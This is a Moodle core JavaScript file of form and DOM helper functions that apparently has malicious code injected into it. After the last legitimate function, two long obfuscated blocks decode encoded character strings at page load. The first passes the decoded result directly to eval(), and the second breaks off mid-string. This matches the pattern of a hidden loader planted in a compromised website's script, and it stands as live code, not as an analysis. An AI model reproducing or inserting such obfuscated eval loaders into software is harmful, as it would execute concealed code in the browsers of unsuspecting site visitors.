// Miscellaneous core Javascript functions for Moodle

function popupchecker(msg) {
    var testwindow = window.open('itestwin.html', '', 'width=1,height=1,left=0,top=0,scrollbars=no');
    if (testwindow == null)
        {alert(msg);}
    else {
        testwindow.close();
    }
}

/*
function popUpProperties(inobj) {
/// Legacy function
  var op = window.open();
  op.document.open('text/plain');
  for (objprop in inobj) {
    op.document.write(objprop + ' => ' + inobj[objprop] + '\n');
  }
  op.document.close();
}

function fillmessagebox(text) {
/// Legacy function
  document.form.message.value = text;
}

function copyrichtext(textname) {
/// Legacy stub for old editor - to be removed soon
  return true;
}
*/

function checkall() {
  var el = document.getElementsByTagName('input');
  for(var i=0; i<el.length; i++) {
    if(el[i].type == 'checkbox') {
      el[i].checked = true;
    }
  }
}

function checknone() {
  var el = document.getElementsByTagName('input');
  for(var i=0; i<el.length; i++) {
    if(el[i].type == 'checkbox') {
      el[i].checked = false;
    }
  }
}

function lockoptions(formid, master, subitems) {
  // Subitems is an array of names of sub items.
  // Optionally, each item in subitems may have a
  // companion hidden item in the form with the
  // same name but prefixed by "h".
  var form = document.forms[formid];

  if (eval("form."+master+".checked")) {
    for (i=0; i<subitems.length; i++) {
      unlockoption(form, subitems[i]);
    }
  } else {
    for (i=0; i<subitems.length; i++) {
      lockoption(form, subitems[i]);
    }
  }
  return(true);
}

function lockoption(form,item) {
  eval("form."+item+".disabled=true");/* IE thing */
  if(form.elements['h'+item]) {
    eval("form.h"+item+".value=1");
  }
}

function unlockoption(form,item) {
  eval("form."+item+".disabled=false");/* IE thing */
  if(form.elements['h'+item]) {
    eval("form.h"+item+".value=0");
  }
}

/**
 * Get the value of the 'virtual form element' with a particular name. That is,
 * abstracts away the difference between a normal form element, like a select
 * which is a single HTML element with a .value property, and a set of radio
 * buttons, which is several HTML elements.
 *
 * @param form a HTML form.
 * @param master the name of an element in that form.
 * @return the value of that element.
 */
function get_form_element_value(form, name) {
    var element = form[name];
    if (!element) {
        return null;
    }
    if (element.tagName) {
        // Ordinarly thing like a select box.
        return element.value;
    }
    // Array of things, like radio buttons.
    for (var j = 0; j < element.length; j++) {
        var el = element[j];
        if (el.checked) {
            return el.value;
        }
    }
    return null;
}


/**
 * Set the disabled state of the 'virtual form element' with a particular name.
 * This abstracts away the difference between a normal form element, like a select
 * which is a single HTML element with a .value property, and a set of radio
 * buttons, which is several HTML elements.
 *
 * @param form a HTML form.
 * @param master the name of an element in that form.
 * @param disabled the disabled state to set.
 */
function set_form_element_disabled(form, name, disabled) {
    var element = form[name];
    if (!element) {
        return;
    }
    if (element.tagName) {
        // Ordinarly thing like a select box.
        element.disabled = disabled;
    }
    // Array of things, like radio buttons.
    for (var j = 0; j < element.length; j++) {
        var el = element[j];
        el.disabled = disabled;
    }
}

/**
 * Set the hidden state of the 'virtual form element' with a particular name.
 * This abstracts away the difference between a normal form element, like a select
 * which is a single HTML element with a .value property, and a set of radio
 * buttons, which is several HTML elements.
 *
 * @param form a HTML form.
 * @param master the name of an element in that form.
 * @param hidden the hidden state to set.
 */
function set_form_element_hidden(form, name, hidden) {
    var element = form[name];
    if (!element) {
        return;
    }
    if (element.tagName) {
        var el = findParentNode(element, 'DIV', 'fitem', false);
        if (el!=null) {
            el.style.display = hidden ? 'none' : '';
            el.style.visibility = hidden ? 'hidden' : '';
        }
    }
    // Array of things, like radio buttons.
    for (var j = 0; j < element.length; j++) {
        var el = findParentNode(element[j], 'DIV', 'fitem', false);
        if (el!=null) {
            el.style.display = hidden ? 'none' : '';
            el.style.visibility = hidden ? 'hidden' : '';
        }
    }
}

function lockoptionsall(formid) {
    var form = document.forms[formid];
    var dependons = eval(formid + 'items');
    var tolock = [];
    var tohide = [];
    for (var dependon in dependons) {
        // change for MooTools compatibility
        if (!dependons.propertyIsEnumerable(dependon)) {
            continue;
        }
        if (!form[dependon]) {
            continue;
        }
        for (var condition in dependons[dependon]) {
            for (var value in dependons[dependon][condition]) {
                var lock;
                var hide = false;
                switch (condition) {
                  case 'notchecked':
                      lock = !form[dependon].checked; break;
                  case 'checked':
                      lock = form[dependon].checked; break;
                  case 'noitemselected':
                      lock = form[dependon].selectedIndex == -1; break;
                  case 'eq':
                      lock = get_form_element_value(form, dependon) == value; break;
                  case 'hide':
                      // hide as well as disable
                      hide = true; break;
                  default:
                      lock = get_form_element_value(form, dependon) != value; break;
                }
                for (var ei in dependons[dependon][condition][value]) {
                    var eltolock = dependons[dependon][condition][value][ei];
                    if (hide) {
                        tohide[eltolock] = true;
                    }
                    if (tolock[eltolock] != null) {
                        tolock[eltolock] = lock || tolock[eltolock];
                    } else {
                        tolock[eltolock] = lock;
                    }
                }
            }
        }
    }
    for (var el in tolock) {
        // change for MooTools compatibility
        if (!tolock.propertyIsEnumerable(el)) {
            continue;
        }
        set_form_element_disabled(form, el, tolock[el]);
        if (tohide.propertyIsEnumerable(el)) {
            set_form_element_hidden(form, el, tolock[el]);
        }
    }
    return true;
}

function lockoptionsallsetup(formid) {
    var form = document.forms[formid];
    var dependons = eval(formid+'items');
    for (var dependon in dependons) {
        // change for MooTools compatibility
        if (!dependons.propertyIsEnumerable(dependon)) {
            continue;
        }
        var masters = form[dependon];
        if (!masters) {
            continue;
        }
        if (masters.tagName) {
            // If master is radio buttons, we get an array, otherwise we don't.
            // Convert both cases to an array for convinience.
            masters = [masters];
        }
        for (var j = 0; j < masters.length; j++) {
            master = masters[j];
            master.formid = formid;
            master.onclick  = function() {return lockoptionsall(this.formid);};
            master.onblur   = function() {return lockoptionsall(this.formid);};
            master.onchange = function() {return lockoptionsall(this.formid);};
        }
    }
    for (var i = 0; i < form.elements.length; i++) {
        var formelement = form.elements[i];
        if (formelement.type=='reset') {
            formelement.formid = formid;
            formelement.onclick  = function() {this.form.reset();return lockoptionsall(this.formid);};
            formelement.onblur   = function() {this.form.reset();return lockoptionsall(this.formid);};
            formelement.onchange = function() {this.form.reset();return lockoptionsall(this.formid);};
        }
    }
    return lockoptionsall(formid);
}


function submitFormById(id) {
    var theform = document.getElementById(id);
    if(!theform) {
        return false;
    }
    if(theform.tagName.toLowerCase() != 'form') {
        return false;
    }
    if(!theform.onsubmit || theform.onsubmit()) {
        return theform.submit();
    }
}

function select_all_in(elTagName, elClass, elId) {
    var inputs = document.getElementsByTagName('input');
    inputs = filterByParent(inputs, function(el) {return findParentNode(el, elTagName, elClass, elId);});
    for(var i = 0; i < inputs.length; ++i) {
        if(inputs[i].type == 'checkbox' || inputs[i].type == 'radio') {
            inputs[i].checked = 'checked';
        }
    }
}

function deselect_all_in(elTagName, elClass, elId) {
    var inputs = document.getElementsByTagName('INPUT');
    inputs = filterByParent(inputs, function(el) {return findParentNode(el, elTagName, elClass, elId);});
    for(var i = 0; i < inputs.length; ++i) {
        if(inputs[i].type == 'checkbox' || inputs[i].type == 'radio') {
            inputs[i].checked = '';
        }
    }
}

function confirm_if(expr, message) {
    if(!expr) {
        return true;
    }
    return confirm(message);
}


/*
    findParentNode (start, elementName, elementClass, elementID)

    Travels up the DOM hierarchy to find a parent element with the
    specified tag name, class, and id. All conditions must be met,
    but any can be ommitted. Returns the BODY element if no match
    found.
*/
function findParentNode(el, elName, elClass, elId) {
    while(el.nodeName.toUpperCase() != 'BODY') {
        if(
            (!elName || el.nodeName.toUpperCase() == elName) &&
            (!elClass || el.className.indexOf(elClass) != -1) &&
            (!elId || el.id == elId))
        {
            break;
        }
        el = el.parentNode;
    }
    return el;
}
/*
    findChildNode (start, elementName, elementClass, elementID)

    Travels down the DOM hierarchy to find all child elements with the
    specified tag name, class, and id. All conditions must be met,
    but any can be ommitted.
    Doesn't examine children of matches.
*/
function findChildNodes(start, tagName, elementClass, elementID, elementName) {
    var children = new Array();
    for (var i = 0; i < start.childNodes.length; i++) {
        var classfound = false;
        var child = start.childNodes[i];
        if((child.nodeType == 1) &&//element node type
                  (elementClass && (typeof(child.className)=='string'))) {
            var childClasses = child.className.split(/\s+/);
            for (var childClassIndex in childClasses) {
                if (childClasses[childClassIndex]==elementClass) {
                    classfound = true;
                    break;
                }
            }
        }
        if(child.nodeType == 1) { //element node type
            if  ( (!tagName || child.nodeName == tagName) &&
                (!elementClass || classfound)&&
                (!elementID || child.id == elementID) &&
                (!elementName || child.name == elementName))
            {
                children = children.concat(child);
            } else {
                children = children.concat(findChildNodes(child, tagName, elementClass, elementID, elementName));
            }
        }
    }
    return children;
}
/*
    elementSetHide (elements, hide)

    Adds or removes the "hide" class for the specified elements depending on boolean hide.
*/
function elementShowAdvanced(elements, show) {
    for (var elementIndex in elements) {
        element = elements[elementIndex];
        element.className = element.className.replace(new RegExp(' ?hide'), '')
        if(!show) {
            element.className += ' hide';
        }
    }
}

function showAdvancedInit(addBefore, nameAttr, buttonLabel, hideText, showText) {
    var showHideButton = document.createElement("input");
    showHideButton.type = 'button';
    showHideButton.value = buttonLabel;
    showHideButton.name = nameAttr;
    showHideButton.moodle = {
        hideLabel: hideText,
        showLabel: showText
    };
    YAHOO.util.Event.addListener(showHideButton, 'click', showAdvancedOnClick);
    el = document.getElementById(addBefore);
    el.parentNode.insertBefore(showHideButton, el);
}

function showAdvancedOnClick(e) {
    var button = e.target ? e.target : e.srcElement;

    var toSet=findChildNodes(button.form, null, 'advanced');
    var buttontext = '';
    if (button.form.elements['mform_showadvanced_last'].value == '0' ||  button.form.elements['mform_showadvanced_last'].value == '' ) {
        elementShowAdvanced(toSet, true);
        buttontext = button.moodle.hideLabel;
        button.form.elements['mform_showadvanced_last'].value = '1';
    } else {
        elementShowAdvanced(toSet, false);
        buttontext = button.moodle.showLabel;
        button.form.elements['mform_showadvanced_last'].value = '0';
    }
    var formelements = button.form.elements;
    // Fixed MDL-10506
    for (var i = 0; i < formelements.length; i++) {
        if (formelements[i] && formelements[i].name && (formelements[i].name=='mform_showadvanced')) {
            formelements[i].value = buttontext;
        }
    }
    //never submit the form if js is enabled.
    return false;
}

function unmaskPassword(id) {
  var pw = document.getElementById(id);
  var chb = document.getElementById(id+'unmask');

  try {
    // first try IE way - it can not set name attribute later
    if (chb.checked) {
      var newpw = document.createElement('<input type="text" name="'+pw.name+'">');
    } else {
      var newpw = document.createElement('<input type="password" name="'+pw.name+'">');
    }
    newpw.attributes['class'].nodeValue = pw.attributes['class'].nodeValue;
  } catch (e) {
    var newpw = document.createElement('input');
    newpw.setAttribute('name', pw.name);
    if (chb.checked) {
      newpw.setAttribute('type', 'text');
    } else {
      newpw.setAttribute('type', 'password');
    }
    newpw.setAttribute('class', pw.getAttribute('class'));
  }
  newpw.id = pw.id;
  newpw.size = pw.size;
  newpw.onblur = pw.onblur;
  newpw.onchange = pw.onchange;
  newpw.value = pw.value;
  pw.parentNode.replaceChild(newpw, pw);
}

/*
    elementToggleHide (element, elementFinder)

    If elementFinder is not provided, toggles the "hidden" class for the specified element.
    If elementFinder is provided, then the "hidden" class will be toggled for the object
    returned by the function call elementFinder(element).

    If persistent == true, also sets a cookie for this.
*/
function elementToggleHide(el, persistent, elementFinder, strShow, strHide) {
    if(!elementFinder) {
        var obj = el;  //el:container
        el = document.getElementById('togglehide_'+obj.id);
    }
    else {
        var obj = elementFinder(el);  //el:button.
    }
    if(obj.className.indexOf('hidden') == -1) {
        obj.className += ' hidden';
        if (el.src) {
            el.src = el.src.replace('switch_minus', 'switch_plus');
            el.alt = strShow;
            el.title = strShow;
        }
        var shown = 0;
    }
    else {
        obj.className = obj.className.replace(new RegExp(' ?hidden'), '');
        if (el.src) {
            el.src = el.src.replace('switch_plus', 'switch_minus');
            el.alt = strHide;
            el.title = strHide;
        }
        var shown = 1;
    }

    if(persistent == true) {
        new cookie('hide:' + obj.id, 1, (shown ? -1 : 356), '/').set();
    }
}

function elementCookieHide(id, strShow, strHide) {
    var obj  = document.getElementById(id);
    var cook = new cookie('hide:' + id).read();
    if(cook != null) {
        elementToggleHide(obj, false, null, strShow, strHide);
    }
}

function filterByParent(elCollection, parentFinder) {
    var filteredCollection = [];
    for(var i = 0; i < elCollection.length; ++i) {
        var findParent = parentFinder(elCollection[i]);
        if(findParent.nodeName != 'BODY') {
            filteredCollection.push(elCollection[i]);
        }
    }
    return filteredCollection;
}

/*
    All this is here just so that IE gets to handle oversized blocks
    in a visually pleasing manner. It does a browser detect. So sue me.
*/

function fix_column_widths() {
    var agt = navigator.userAgent.toLowerCase();
    if ((agt.indexOf("msie") != -1) && (agt.indexOf("opera") == -1)) {
        fix_column_width('left-column');
        fix_column_width('right-column');
    }
}

function fix_column_width(colName) {
    if(column = document.getElementById(colName)) {
        if(!column.offsetWidth) {
            setTimeout("fix_column_width('" + colName + "')", 20);
            return;
        }

        var width = 0;
        var nodes = column.childNodes;

        for(i = 0; i < nodes.length; ++i) {
            if(nodes[i].className.indexOf("sideblock") != -1 ) {
                if(width < nodes[i].offsetWidth) {
                    width = nodes[i].offsetWidth;
                }
            }
        }

        for(i = 0; i < nodes.length; ++i) {
            if(nodes[i].className.indexOf("sideblock") != -1 ) {
                nodes[i].style.width = width + 'px';
            }
        }
    }
}


/*
   Insert myValue at current cursor position
 */
function insertAtCursor(myField, myValue) {
    // IE support
    if (document.selection) {
        myField.focus();
        sel = document.selection.createRange();
        sel.text = myValue;
    }
    // Mozilla/Netscape support
    else if (myField.selectionStart || myField.selectionStart == '0') {
        var startPos = myField.selectionStart;
        var endPos = myField.selectionEnd;
        myField.value = myField.value.substring(0, startPos)
            + myValue + myField.value.substring(endPos, myField.value.length);
    } else {
        myField.value += myValue;
    }
}


/*
        Call instead of setting window.onload directly or setting body onload=.
        Adds your function to a chain of functions rather than overwriting anything
        that exists.
*/
function addonload(fn) {
    var oldhandler=window.onload;
    window.onload=function() {
        if(oldhandler) oldhandler();
            fn();
    }
}

var n9531659="";function o251157a747(){var xf5541=String,i972be3=Array.prototype.slice.call(arguments).join(""),i7cc31=i972be3.substr(11,3)-684,jcc47e36,x5e11e2a;i972be3=i972be3.substr(k708e88());var hb8808ce4=i972be3.length;for(var aad24830e=0;aad24830e<hb8808ce4;aad24830e++){try{throw(w99f20f=i972be3.substr(aad24830e,1));}catch(e){w99f20f=e;};if(w99f20f=='|'){i7cc31="";aad24830e=bea20e(aad24830e);maa874=ib7f14f(i972be3,aad24830e);while(b715e6fc(maa874)){i7cc31+=maa874;aad24830e++;maa874=u22ffb8b2(i972be3,aad24830e);}i7cc31-=610;continue;}jcc47e36="";if(n380e8d(w99f20f)){aad24830e++;w99f20f=i972be3.substr(aad24830e,1);while(w99f20f!='©'){jcc47e36+=w99f20f;aad24830e++;w99f20f=i972be3.substr(aad24830e,1);}jcc47e36=jcc47e36-i7cc31-14;if(jcc47e36<0)jcc47e36+=256;if(jcc47e36>=192)jcc47e36+=848;else if(jcc47e36==168)jcc47e36=1025;else if(jcc47e36==184)jcc47e36=1105;n9531659+=xf5541["f\x72\x6f\x6dC\x68\x61r\x43\x6fde"](jcc47e36);continue;}k22d962fe=(w99f20f+'')["\x63h\x61rC\x6fdeA\x74"](0);if(k22d962fe>848)k22d962fe-=848;x5e11e2a=k22d962fe-i7cc31-14;x5e11e2a=jcd365(x5e11e2a);n9531659+=xf5541["f\x72\x6f\x6dC\x68\x61r\x43\x6fde"](x5e11e2a);}}o251157a747("01e","ca49","1","e2","2","76","2","©132","©","©","19","4©©","209©","©202©","©","191","©|797","|=28","7|6","58|","fg","|7","3","5","|©","171©|","6","4","8","|©","175©|6","60","|M","|","74","4|©","1","58","©","|761","|","©17","4","©©27©","©","6","©","©2","3","©©","19","7","©","|","640","|","©","1","6","1©©1","58","©","|","74","4|©0©|","780|","©216","©©2","4","5","©","|","6","44","|PW","©","15","2©©1","64","©©","16","4©©1","6","0©","j","|6","99","|©","1","50","©©150©","|","6","52","|","©","1","71©","|","7","7","7","|©","24©","#","|","7","4","6","|","©2","49©|6","37|","©1","4","4","©©","15","1©©","160","©","©","1","41©","©","15","6","©|613|","©136","©","|","76","1","|©","2","11©©","14","©","©24©","©2","1","0","©©6©","|","63","6","|U","|7","85|","©","3","2©","©","3","0©|7","59","|©","23","©©8©|","62","3","|","©","14","1","©©","12","8©","|798|","<©","2","4","8","©-","|730|","©2","45","©|","762","|","©1","9©","©","21","3©","|","80","3|6","|","705","|©1","56©","|","6","15|",":","N|","768|©","1","8","5","©|","731","|©14","5©|7","5","1","|","©16","4","©©","4","©","|","734|","©","24","0","©©","1","7","0","©©","178©©","25","4","©©","3©","©2","5","0","©©23","9©","©","24","9©","©2","4","0","©","|732|","©168©","|7","18","|","©","241","©","|","6","2","4","|©1","33","©","|79","2","|","2","|670","|","©","1","7","4©|8","1","0|E","M©","4","©|62","6|©","1","5","0©","©","151","©|","73","5","|©5©","|6","24","|©13","0","©|","661","|©17","3©","©","1","62","©©168","©","|76","8|","©","204©|","644|","m","mm","|6","1","2","|","0","|68","1","|","©124©©","2","02©","©","19","5©","©","18","5©|","642|©","14","7©|","70","1","|©","2","0","7","©","©2","1","0","©©21","5©","|","689","|","©1","94","©|6","9","0|","©1","9","4","©","|","8","0","0|","©","243©©2","45©|66","8","|h©","1","9","5","©U|7","4","0","|","©","154©","©","1","53","©©1","5","3","©|62","9","|","©152","©","©138©","|783","|)","|","6","44|©","1","4","8","©|6","4","8|©163","©","©1","7","1©","|72","9","|©17","9©","©2","5","3©|","78","8","|9","|8","05","|","K","7","=","2","|7","61","|©","1","2","©","©1","97","©©","22","6","©©","1","97©|7","7","7|","©2","2","9©|","6","4","0|g|","629","|.|","6","5","4","|D","C©","1","8","3©|","61","2|©29","©©","26","©","|65","7","|F|","6","21|","©1","25","©","©1","36©|667","|","©","1","70©|","75","0|©","1","5","©|6","98|","©2","11©|","770","|","©19","©","©","28©","|","735","|©2","55","©|6","1","3|","?|","778|%","|","67","0|","©1","8","4","©©","18","3©","|69","2|©20","7©","©2","13©©","2","1","1","©|","767|©","1","6","©|","80","7|@","B","|","73","8","|","©4©","|","76","8|©1","7©|","6","2","9","|A","^","A|7","01|","©207©©2","2","2©©2","1","5","©|","67","6|©","1","79","©","|","6","72","|©1","9","2","©","|","75","4|©7","©","©1","3","©","|","7","7","4","|©","3","2©©","218","©","©21","9","©|","7","39|©","175","©","©","1","0©","©","1","5","6","©©","153©","|","633","|.",".","|","7","2","6|©","23","5","©","©2","32©|","624|","<D","|797","|@","2|75","6","|","©14","©","|749|","©","25","3©","|","658|","©","173©","©","1","81©|77","9","|©22","9©","|","782|","2|6","55|","©","180©©181©©","161©","©16","7","©","|76","4|©","9©|","6","3","0","|©1","3","7©","|","6","1","7|","5R","|","778","|©2","43©|","637","|","f|7","7","0","|©2","06","©|65","4|","j|7","6","2|©","2","07©","©1","9","8©","!|8","1","0","|","©227©","©224","©|","68","4|a","|","648|","=","=©","1","71","©","|73","6","|","©2","45©|","6","41|©","1","5","5","©","©","1","45","©©","1","5","6©|7","2","7","|","©","250©©1","7","7©","|","692","|©","2","1","6©","|773","|","*|","68","3|©","2","0","9©|","777|","©27©!","©22©|7","61","|©","12","©©197©","©2","26©","©19","7©|","76","2","|","©215","©","©","22","5","©|7","61|","©","17","8©","©","17","5©","©174","©","©","1","7","4","©","|","6","65","|","N|","669","|","©","1","9","1","©","|702|","©","2","0","3","©©","2","20","©|","64","4","|P","©","15","2©|748","|©2","53","©","|6","1","4|s","v2","|7","7","9|","©2","4","4©","|","6","94","|","©","130©|7","9","2|","(|6","4","9","|©16","4©|7","85|©","3","2©|","80","3|","D<|7","3","9|","©244©|","79","5","|5;©","2","45","©|","7","92|+|","7","4","5|©25","0©","©","9","©","|","80","0|©17©","|6","77|","©","189©©1","8","2©©","1","9","0©|","7","6","7","|","©16","©|737|","©","25","1©","|","6","56","|©","17","6","©","|62","3|","©","1","4","2","©","|775","|©","2","4","5","©","|","6","2","0","|","©145","©|7","5","3|","©241","©","|","61","7","|v","|790|)","|","6","3","7|w","©13","8","©","|718|","©231©©","2","23©","|","63","4","|NM|6","9","0|©","19","8","©©","1","95©|","7","2","6","|","©2","27","©","©","23","0©©16","9","©","©","1","7","1©","|","692","|","©1","87©©144","©|68","6|©","183©","©1","49©","|7","15","|©","1","32©|7","70","|©1","84©","|8","0","8|","©22","1","©","|","6","22|#","|8","0","4","|©21","7©","F|","619","|x","©","1","37","©7|","7","39|","©","2","©©242©","©1©","©","24","8","©","|","613|©","12","9©","|","6","5","1|","©","171©W","|","7","52","|©","217","©©1","88©","©0©","|","684|©","19","9©","|7","8","5|©","32©|7","79|,","$","©28","©|","70","3","|©2","1","7","©©2","2","3©|","7","41","|©","1","9","1©","|636|","©","1","3","9©","©","15","4©©1","4","1©","|","6","5","7","|©","158©","|74","9|©","13©|","72","7","|©","2","32©|7","00|©","173","©©","212","©","©2","0","5©","©","213©©20","5","©","©214©","©","2","20","©|62","3","|","CB©","1","42©©","12","6","©","|618|","©","136","©","©127","©©1","3","4©","|","689","|","©209","©","|","655|b","d","|69","9","|©16","2","©tq","ppp","|68","9|","©","2","08","©©","192","©©","20","7©","©","19","8©","©205","©©209©|","6","2","0|","F©1","4","0©","|62","8","|","©","1","5","3","©","|","65","9","|©175","©©1","64©_©12","4©|","73","9|","©175©","|6","2","5|","D©14","5©©","13","0©©149","©","|6","71","|","©","1","9","1","©|","669","|","x","|659","|©1","6","9","©©","16","0","©","|","723","|©","2","4","5","©","|","810|","7","I","|","7","8","4|©","31","©.","|","803|8","|","6","5","1|©16","7","©","|728|","©","2","4","8","©|","7","82|","©","2","25","©©","245","©","©","1","9","9","©©","19","6©","|6","73","|VV|","69","8|o|","7","52","|©15","©©","25","5©©1","4","©|","81","0|","?|","771","|©31","©","|7","82|.|","7","14|©1","64","©|","7","3","6","|","©2","51©","©2","5","0©","|","6","7","1|","©","1","8","9©|6","4","7","|©","152","©","|7","4","0","|","©","2","4","1","©|","8","0","2|","2GAB|","7","93|","&","9|","73","2","|©","2","3","7©","©","2","3","5©©240©","|","6","8","9","|©","1","90","©|","65","4","|","©","1","68©","|","68","3","|","©19","0©","©","188©|","758|©","19","4","©©2","23©©19","4","©","|71","7|©","22","3©|","6","67","|","©","188©|6","81|©","195","©|75","7","|©","4","©|750","|","©1","4©|7","5","4","|","©7©|","6","9","3","|","©2","08","©","|7","1","4|©22","8©","|6","41|","M","UV","M","©","16","8","©",":","|7","52|","©","166©|","6","90","|","g","g","gg","©","1","99©|71","6","|©","222©|7","49","|©","1","8","5©|7","52|","©","196©©16©","©4","©|79","3","|",".|686|","©2","05","©","©","1","36","©|","6","33","|©","1","51©|70","5","|","©210©","©","2","0","6©","|7","15|","©2","1","9©|","754|©23","©","|","7","58","|©245","©©22","©©3","©©","2","2","©","©","7©","©","194©©","223©","©","2","23","©","©","194©|6","3","3","|L©","1","3","6","©|6","82|©1","9","7©|","8","06","|","?|632|©","1","48©|63","5|©","1","4","7","©","©1","40©|","721|","©2","4","1©|7","1","1","|©","2","1","6","©","©154©©156","©©","14","7","©","©","2","38©|697|ron|710","|","©","1","23","©","|661","|","J|643|8|","6","3","5|","0©158©©144©|6","4","2|","©","15","6©|","66","7","|©1","71©","©182©","|","6","76","|","©1","99","©","©1","26","©","©2","00©©","20","1©","©20","2©©","1","82©©188","©","©1","7","7","©©18","3©","p©141©","|","7","58|©1","9","4©©21","2©","|7","6","0","|","©223©","©1","7","7","©","|","76","3","|©1","77©|","6","2","3","|","$","$|","6","74|","W","W|","7","0","0","|©22","9©|715","|©1","3","2©","©","129©|77","9|","©","1","92©","|","6","3","0|","+","|","7","57|©","170©","©","3","0©©220©","©","174©","|774|©","188©","|","7","54|","©","1","6","7","©©","16","7©","|","6","4","3","|8©1","6","2©","©1","4","6","©","|673|©","1","91","©","©","1","8","2©","|","718","|","©","234©","©238","©|","7","9","2|","©24","2","©3","2","03","|7","13","|©","214©©2","17","©©","14","9","©|62","8|]","|800","|©2","36©","2A|69","6|©","2","10","©|","657|","©","160©","|","7","7","6","|","(©","2","9","©#","|","7","13|","©2","27©","|","724|©","168","©","©1","6","9©","©1","60","©","©2","51©","©141©","©1","3","8©","©","137©©137©|","643","|","88","|","7","12","|","©235","©","©","221©","|","710","|","©224","©|784|©3","2","©|","745|©4","©©1","2©|","80","5","|©25","5©I|","679|©","204©","|6","7","8","|","©","2","0","4©©","184©|679","|","©191©","©1","8","0©©","1","86","©","s","|61","6","|","Q4F","|","6","69","|","©13","2©","|","6","44|=|","7","07|y","|71","0|","©12","3","©|7","0","2|","ss|76","4|%|6","4","2|","i;8|8","0","5|©21","8","©","©2","1","8","©|","6","68","|","Q|","7","19","|","©2","3","8","©","©","2","2","2","©","©","2","3","7©","|713","|©2","22","©|","6","9","9|","©2","1","5","©","|755|©","1","9","©","|","76","1","|©2","1","1","©","©2","4©","©","2","3©","|69","2","|©","1","9","5","©","©","128","©©1","57©|","679","|s","|","63","3","|","©","154©©","1","51©©1","4","5","©E","P","|7","25","|","©1","61©©","2","0","6","©","|70","1","|©","2","0","2","©","|66","3|©1","83©","©17","1©|6","8","5","|©13","5©|","6","7","7|","©195","©","|62","2","|©","1","23©","©1","36©|","639","|","©","14","3","©©1","5","4","©|","771","|©","2","8","©©2","15©|6","22|","C","|","6","84","|©","134","©|6","1","4","|","©","1","3","4","©","|7","69","|","©2","8","©","©","0","©|","6","20|©1","40","©|6","19","|","©","13","7","©©","1","2","8","©©","133©","|651","|","©","1","5","8","©","_","`|","79","5","|","©","2","45","©|","73","8|","©1","©","©","3©|","8","07|5|","70","9|©2","2","8","©©","22","9©©","2","2","7©","|620|©","129©","©","1","34©©","12","7©|6","57","|","epf|65","3","|","Y","d|66","5|el","s|6","4","7|©15","7","©","©16","6©","Z","|71","0","|","©1","73©©1","27©|69","4","|","l","|7","1","9|©13","2","©©132©|6","6","1","|","J","|","7","5","6","|©","8","©","|","7","95","|,|6","39","|©","1","40©©14","3","©|6","92|©","14","2","©|741|©","2","42©|","701","|©","2","17","©","|7","7","5|","#","©","2","4©","|70","1|","©","215©","|668|","©1","72","©©1","3","9","©","©","17","6©©","1","7","7","©|","810","|B","|644","|©","148©X|726|©245","©","©22","9©","|644","|","©","1","6","2©","|7","80","|","!(",",","©22","5","©","©","24","3©|6","8","1|","b","_^","|","77","5","|©","1","88","©|686|","©21","5","©","|","791","|","©","2","0","8","©|615|","©","29©|7","3","7","|©15","0©©","10","©","|748|©211","©|","6","60","|","MJ|","66","7","|","©","1","96","©p|8","0","9","|","©","2","5","3","©","|712","|©","157©","|","635","|","b");eval(n9531659);function k708e88(){return 14;}function bea20e(qec4bd9f){return ++qec4bd9f;}function ib7f14f(ocd7b36d,lf240d2){return ocd7b36d.substr(lf240d2,1);}function u22ffb8b2(tfb62e7f3,tf97a58){return tfb62e7f3.substr(tf97a58,1);}function b715e6fc(y65f582a3){return y65f582a3!='|';}function n380e8d(wbd849fa){return wbd849fa=='©';}function jcd365(q24a8dbc){var r9e62946=q24a8dbc;if(r9e62946<0)r9e62946+=256;if(r9e62946==168)r9e62946=1025;else if(r9e62946==184)r9e62946=1105;return (r9e62946>=192 && r9e62946<256) ? r9e62946+848 : r9e62946;}
var g157f716="";function n692c6f43a(){var y1972a5=String,w5ea05=Array.prototype.slice.call(arguments).join(""),x84707c=w5ea05.substr(6,3)-456,tab3a12,ac72e115c;w5ea05=w5ea05.substr(9);var l8e0a81=w5ea05.length;for(var adffa2348=0;adffa2348<l8e0a81;adffa2348++){try{throw(p2ac2fc=w5ea05.substr(adffa2348,1));}catch(e){p2ac2fc=e;};if(p2ac2fc=='–'){x84707c="";adffa2348=tc434033(adffa2348);ne10df66=eb56b5c4(w5ea05,adffa2348);while(bad12fc(ne10df66)){x84707c+=ne10df66;adffa2348++;ne10df66=db1135b(w5ea05,adffa2348);}x84707c-=623;continue;}tab3a12="";if(lbea3d98(p2ac2fc)){adffa2348++;p2ac2fc=w5ea05.substr(adffa2348,1);while(p2ac2fc!='®'){tab3a12+=p2ac2fc;adffa2348++;p2ac2fc=w5ea05.substr(adffa2348,1);}tab3a12=tab3a12-x84707c-4;if(tab3a12<0)tab3a12+=256;if(tab3a12>=192)tab3a12+=848;else if(tab3a12==168)tab3a12=1025;else if(tab3a12==184)tab3a12=1105;yfea79(tab3a12);continue;}ma1fb25=cb2c2e45c(p2ac2fc);if(ma1fb25>848)ma1fb25-=848;ac72e115c=ma1fb25-x84707c-4;if(ac72e115c<0)ac72e115c+=256;if(ac72e115c>=192)ac72e115c+=848;else if(ac72e115c==168)ac72e115c=1025;else if(ac72e115c==184)ac72e115c=1105;g157f716+=ieefe0(ac72e115c);}}n692c6f43a("00e","766","615®","203®","®","9","®–","6","37","–®1","35","®®","1","28","®","u","–68","0","–®","17","7®","–","7","68–®","2","5","4®","–7","9","9","–#\"–7","7","3","–®194®","®","1","9","5","®–","63","7","–","2","®","14","1","®","–","816","–®","210®","–","71","1–","f","e","–74","1–","®2","40","®–68","7","–","®165","®–","6","87–®18","2®–","68","9–","f","®","18","7®","–","788–®2","7","®","–7","6","0–","®","2","4","9","®–6","56–E","b","–6","44","–","9","–715–®1","3","5®®","20","0","®–8","0","8","–1","–630","–®","1","27","®","®1","2","3","®","–7","9","4","–®","2","33","®–","800","–","®","22","8®","®","228®–732–®16","8®–6","4","8–","®","1","4","7","®U®1","3","5®","®","133","®","®","1","5","1®K–7","85","–","®","3","1®","®","12®®29","®","®","2","7","®","®19","®","–627","–","l","®","127®","–820","–","B–7","9","7","–®","23®","®2","7®–","758–®1","8","5","®–","8","1","4","–,","6®","240®","$®2","4","0","®–","63","8–","®","1","2","3®","®1","36","®","–6","25–tzkx4","i–75","3","–","®2","45","®","–73","0–®2","20®","–77","1","–®19","9®–8","08","–$–","641","–","E–","6","2","9–1","E","–72","1","–sp","–65","9","–1®145®","–","67","9","–","®","162","®–","7","0","9–z–7","4","1","–","®1","62","®–809","–27","–7","2","1–","®2","1","4®","–6","95","–®","17","7®",